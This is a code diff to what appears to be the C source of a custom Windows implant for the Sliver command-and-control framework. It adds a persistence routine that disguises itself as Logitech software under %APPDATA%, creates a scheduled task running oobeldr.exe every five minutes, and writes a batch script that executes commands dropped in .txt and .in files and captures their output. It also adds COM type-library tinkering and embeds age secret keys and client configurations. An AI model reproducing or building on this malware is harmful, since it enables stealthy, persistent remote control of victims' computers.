@@ -2050,7 +2050,7 @@ CLEANUP:
 }
 
 void test125(void) {
-	PersistenceMethod2("C:\\Windows\\System32\\cmd.exe");
+	//PersistenceMethod2("C:\\Windows\\System32\\cmd.exe");
 }
 
 void test126(void) {
@@ -2062,7 +2062,7 @@ void test127(void) {
 }
 
 void test128(void) {
-	Persistence();
+	//Persistence();
 }
 
 VOID Callback129
@@ -2078,61 +2078,287 @@ void test129(void) {
 	RegisterAsyncEvent(L"SELECT * FROM Win32_ComputerShutdownEvent", Callback129, NULL);
 }
 
+void test130(void) {
+	HANDLE hTransaction = INVALID_HANDLE_VALUE;
+	HKEY hKey = NULL;
+	HKEY hTypeLibHkey = NULL;
+	LSTATUS Status = STATUS_SUCCESS;
+
+	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
+	if (hTransaction == INVALID_HANDLE_VALUE) {
+		LOG_ERROR("CreateTransaction", GetLastError());
+		goto CLEANUP;
+	}
+	
+	Status = RegOpenKeyTransactedA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey, hTransaction, NULL);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegCreateKeyTransactedA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegCreateKeyExA(hKey, "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\\1.1\\0", 0, NULL, 0, KEY_WRITE, NULL, &hTypeLibHkey, NULL);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegCreateKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	if (!CommitTransaction(hTransaction)) {
+		LOG_ERROR("CommitTransaction", GetLastError());
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	if (hTransaction != INVALID_HANDLE_VALUE) {
+		CloseHandle(hTransaction);
+	}
+
+}
+
+void test131(void) {
+	LPITEMIDLIST IdList = NULL;
+	HRESULT hResult = S_OK;
+
+	CoInitialize(NULL);
+	hResult = SHParseDisplayName(L"C:\\Users\\Admin\\Desktop", NULL, &IdList, 0, NULL);
+	if (hResult != S_OK) {
+		LOG_ERROR("SHParseDisplayName", hResult);
+		return;
+	}
+
+	hResult = SHOpenFolderAndSelectItems(IdList, 0, NULL, 0);
+	LOG_ERROR("SHOpenFolderAndSelectItems", hResult);
+	if (hResult != S_OK) {
+		return;
+	}
+
+	
+	HexDump(IdList->mkid.abID, IdList->mkid.cb);
+	PrintFormatA("Is ok\n");
+	CoUninitialize();
+}
+
+BOOL AddReference
+(
+	_In_ LPWSTR lpOutputName,
+	_In_ LPWSTR lpInterfaceName,
+	_In_ REFGUID TypeLibGUID,
+	_In_ REFGUID IID,
+	_In_ ITypeLib* RefTypelib,
+	_In_ REFGUID RefIID
+)
+{
+	ICreateTypeLib2* TypeLib2 = NULL;
+	ICreateTypeInfo* CreateTypeInfo = NULL;
+	HREFTYPE RefType = 0;
+	ITypeInfo* RefTypeInfo = NULL;
+	HRESULT hResult = S_OK;
+	BOOL Result = FALSE;
+
+	hResult = RefTypelib->lpVtbl->GetTypeInfoOfGuid(RefTypelib, RefIID, &RefTypeInfo);
+	if (FAILED(hResult)) {
+		LOG_ERROR("RefTypelib->GetTypeInfoOfGuid", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = CreateTypeLib2(SYS_WIN32, lpOutputName, &TypeLib2);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateTypeLib2", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = TypeLib2->lpVtbl->SetGuid(TypeLib2, TypeLibGUID);
+	if (FAILED(hResult)) {
+		LOG_ERROR("ITypeLib2->SetGuid", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = TypeLib2->lpVtbl->CreateTypeInfo(TypeLib2, lpInterfaceName, TKIND_INTERFACE, &CreateTypeInfo);
+	if (FAILED(hResult)) {
+		LOG_ERROR("ITypeLib2->CreateTypeInfo", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = CreateTypeInfo->lpVtbl->SetTypeFlags(CreateTypeInfo, TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateTypeInfo->SetTypeFlags", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = CreateTypeInfo->lpVtbl->AddRefTypeInfo(CreateTypeInfo, RefTypeInfo, &RefType);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateTypeInfo->AddRefTypeInfo", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = CreateTypeInfo->lpVtbl->AddImplType(CreateTypeInfo, 0, RefType);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateTypeInfo->AddImplType", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = CreateTypeInfo->lpVtbl->SetGuid(CreateTypeInfo, IID);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateTypeInfo->SetGuid", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = TypeLib2->lpVtbl->SaveAllChanges(TypeLib2);
+	if (FAILED(hResult)) {
+		LOG_ERROR("TypeLib2->SaveAllChanges", hResult);
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (RefTypeInfo != NULL) {
+		RefTypeInfo->lpVtbl->Release(RefTypeInfo);
+	}
+
+	if (TypeLib2 != NULL) {
+		TypeLib2->lpVtbl->Release(TypeLib2);
+	}
+
+	if (CreateTypeInfo != NULL) {
+		CreateTypeInfo->lpVtbl->Release(CreateTypeInfo);
+	}
+
+	return Result;
+}
+
+void test132(void) {
+	HRESULT hResult = S_OK;
+	ITypeLib* StdOle2 = NULL;
+	ITypeLib* MyTypeLib = NULL;
+	GUID TypeLibGUID = { 0x6131C8B1, 0x7704, 0x45CF, { 0xBA, 0x1A, 0x93, 0x1F, 0x92, 0x4E, 0x09, 0x45 } };
+	GUID IID = { 0x681AAE63, 0x51BA, 0x40a2, { 0x86, 0xC8, 0x55, 0x51, 0x85, 0x2F, 0xA2, 0xBD } };
+	GUID RefIID = { 0xb36e6a53, 0x8073, 0x499e, { 0x82, 0x4c, 0xd7, 0x76, 0x33, 0x0a, 0x33, 0x3e } };
+	GUID Test2IID = { 0xE5171F7C, 0x4CEC, 0x4903, { 0x94, 0x99, 0xA7, 0x24, 0xB6, 0x17, 0x8B, 0x30 } };
+	GUID TypeLibIID2 = { 0x7A873F4B, 0x809C, 0x4B8B, { 0xA4, 0xF1, 0xF5, 0x91, 0x7F, 0x25, 0x65, 0xbF } };
+	WCHAR wszSctPath[] = L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\log.sct";
+	WCHAR wszOutputPath[] = L"C:\\Users\\Admin\\Desktop\\output.tlb";
+	LPWSTR lpTypeLibPath = NULL;
+	DWORD i = 0;
+
+	lpTypeLibPath = ALLOC((lstrlenW(wszSctPath) + 1) * sizeof(WCHAR));
+	for (i = 0; i < lstrlenW(wszSctPath); i++) {
+		lpTypeLibPath[i] = L'A';
+	}
+
+	hResult = LoadTypeLib(L"stdole2.tlb", &StdOle2);
+	if (FAILED(hResult)) {
+		LOG_ERROR("LoadTypeLib", hResult);
+		goto CLEANUP;
+	}
+
+	if (!AddReference(lpTypeLibPath, L"ITest", &TypeLibGUID, &IID, StdOle2, &IID_IDispatch)) {
+		goto CLEANUP;
+	}
+
+	hResult = LoadTypeLib(lpTypeLibPath, &MyTypeLib);
+	if (FAILED(hResult)) {
+		LOG_ERROR("LoadTypeLib", hResult);
+		goto CLEANUP;
+	}
+
+	if (!AddReference(wszOutputPath, L"ITest2", &TypeLibIID2, &Test2IID, MyTypeLib, &IID)) {
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	return;
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
 )
 {
+	PBYTE pHashValue = NULL;
 	LPSTR lpMutexName = NULL;
+	LPWSTR lpTemp = NULL;
 	BOOL Result = FALSE;
 
-	lpMutexName = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
-	lpMutexName[16] = '\0';
+	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
+	lpMutexName = ConvertBytesToHexA(pHashValue, 8);
+	lpTemp = ConvertCharToWchar(lpMutexName);
 	pConfig->hMutex = CreateMutexA(NULL, TRUE, lpMutexName);
 	if (pConfig->hMutex == NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
 		Result = TRUE;
 	}
 
+	FREE(pHashValue);
 	FREE(lpMutexName);
+	FREE(lpTemp);
+
 	return Result;
 }
 
-BOOL Persistence()
+BOOL Persistence
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
 {
 	CHAR szModulePath[0x200];
 	CHAR szOOBEPath[MAX_PATH];
-	WCHAR wszExeListPath[MAX_PATH];
 	LPSTR lpTemp = NULL;
-	CHAR szCommand[] = "@echo off\nFor /f \"delims=\" %%a in ('Type \"%APPDATA%\\com.logi\\list.txt\"') do (%%a)";
+	LPSTR lpTemp2 = NULL;
+	LPSTR lpCommand = NULL;
+	BOOL Result = FALSE;
+	PBYTE pHashValue = NULL;
+	LPWSTR lpMutexName = NULL;
+	LPWSTR lpLockPath = NULL;
 
 	SecureZeroMemory(szModulePath, sizeof(szModulePath));
+
+	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
+	lpMutexName = ConvertBytesToHexW(pHashValue, 8);
+	lpLockPath = DuplicateStrW(pConfig->lpScriptPath, lstrlenW(lpMutexName) + 6);
+	lstrcatW(lpLockPath, L"\\");
+	lstrcatW(lpLockPath, lpMutexName);
+	lstrcatW(lpLockPath, L".txt");
+	if (IsFileExist(lpLockPath)) {
+		Result = TRUE;
+		goto CLEANUP;
+	}
+
 	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
+	if (!WriteToFile(lpLockPath, szModulePath, lstrlenA(szModulePath))) {
+		goto CLEANUP;
+	}
+
+	lpCommand = DuplicateStrA("@echo off\n@cd ", 0);
+	lpTemp = ConvertWcharToChar(pConfig->lpScriptPath);
+	lpCommand = StrCatExA(lpCommand, lpTemp);
+	lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\System32\oobe\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"% ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.in) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (set c=%%b) & for /f \"tokens=*\" %%d in (%%a) do (%%d 1>%c%.out 2>%c%.err) & del %%a)");
+	if (!PersistenceMethod1(lpCommand)) {
+		goto CLEANUP;
+	}
+
 	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
-	lpTemp = StrStrA(szOOBEPath, "system32");
-	lpTemp[0] = 'S';
+	lpTemp2 = StrStrA(szOOBEPath, "system32");
+	lpTemp2[0] = 'S';
 	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
-	szModulePath[lstrlenA(szModulePath)] = '\n';
-	ExpandEnvironmentStringsW(L"%APPDATA%\\com.logi\\list.txt", wszExeListPath, _countof(wszExeListPath));
-	if (!AppendToFile(wszExeListPath, szModulePath, lstrlenA(szModulePath))) {
-		return FALSE;
+	if (!PersistenceMethod2(szOOBEPath, pConfig)) {
+		goto CLEANUP;
 	}
 
-	if (!PersistenceMethod1(szCommand)) {
-		PrintFormatA("PersistenceMethod1 failed: %s\n", szCommand);
-		return FALSE;
-	}
+	Result = TRUE;
+CLEANUP:
+	CreateFileW(lpLockPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	if (!PersistenceMethod2(szOOBEPath)) {
-		PrintFormatA("PersistenceMethod2 failed: %s\n", szOOBEPath);
-		return FALSE;
-	}
+	FREE(lpCommand);
+	FREE(lpTemp);
+	FREE(pHashValue);
+	FREE(lpMutexName);
+	FREE(lpLockPath);
 
-	return TRUE;
+	return Result;
 }
 
 VOID Final(VOID)
 {
 	DWORD dwThreadId = 0;
+	DWORD cchSliverPath = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 
 	UINT64 uEncoderNonce = 13;
@@ -2149,24 +2375,24 @@ VOID Final(VOID)
 	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
 #elif _SESSION
 	// From Phan Chu Trinh
-	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	CHAR szSliverClientName[] = "DECISIVE_FERRY";
 	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";*/
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";
 
 	// From Tu Dinh
-	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
 	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";*/
 #else
 	// From Phan Chu Trinh
 	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
@@ -2209,17 +2435,25 @@ VOID Final(VOID)
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 	pGlobalConfig->uPeerID = GeneratePeerID();
 	pGlobalConfig->dwListenerID = 1;
+	pGlobalConfig->lpScriptPath = ALLOC(sizeof(WCHAR) * MAX_PATH);
+	cchSliverPath = ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech", pGlobalConfig->lpScriptPath, MAX_PATH);
+	if (cchSliverPath >= MAX_PATH) {
+		pGlobalConfig->lpScriptPath = REALLOC(pGlobalConfig->lpScriptPath, (cchSliverPath + 1) * sizeof(WCHAR));
+		ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech", pGlobalConfig->lpScriptPath, cchSliverPath + 1);
+	}
+
 	InitializeSRWLock(&pGlobalConfig->RWLock);
 	if (IsExist(pGlobalConfig)) {
 		goto CLEANUP;
 	}
 
 #ifdef _DEBUG
-	if (!Persistence()) {
+	if (!Persistence(pGlobalConfig)) {
 		goto CLEANUP;
 	}
 #endif
 
+	MessageBoxA(NULL, "Hello World", "Title", MB_OK);
 #ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
@@ -2262,7 +2496,7 @@ LRESULT WindowProc
 	_In_ LPARAM lParam
 )
 {
-	if (uMsg == WM_QUERYENDSESSION && lParam == 0) {
+	if (uMsg == WM_QUERYENDSESSION) {
 		WriteToFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", "1", 1);
 	}
 }
@@ -2310,20 +2544,21 @@ CLEANUP:
 	return;
 }
 
-int WinMain
-(
-	_In_ HINSTANCE hInstance,
-	_In_opt_ HINSTANCE hPrevInstance,
-	_In_ LPSTR lpCmdLine,
-	_In_ int nShowCmd
-)
+//int WinMain
+//(
+//	_In_ HINSTANCE hInstance,
+//	_In_opt_ HINSTANCE hPrevInstance,
+//	_In_ LPSTR lpCmdLine,
+//	_In_ int nShowCmd
+//)
+int main(void)
 {
 	DWORD dwLevel = 0;
 	DWORD dwFlags = 0;
 	HANDLE hThread = NULL;
 
-	AllocConsole();
-	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
+	//AllocConsole();
+	/*if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
 		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
 			LOG_ERROR("SetProcessShutdownParameters", GetLastError());
 			goto CLEANUP;
@@ -2332,7 +2567,7 @@ int WinMain
 	else {
 		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
 		goto CLEANUP;
-	}
+	}*/
 
 	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	LoadLibraryW(L"advapi32.dll");
@@ -2354,10 +2589,10 @@ int WinMain
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
 
-	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetMessageLoop, hInstance, 0, NULL);
+	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetMessageLoop, hInstance, 0, NULL);
 	if (hThread == NULL) {
 		goto CLEANUP;
-	}
+	}*/
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
 	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
@@ -2484,8 +2719,11 @@ int WinMain
 	//test127();
 	//test128();
 	//test129();
+	//test130();
+	//test131();
+	test132();
 	//Final();
-	WaitForSingleObject(hThread, INFINITE);
+	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
 		CloseHandle(hThread);
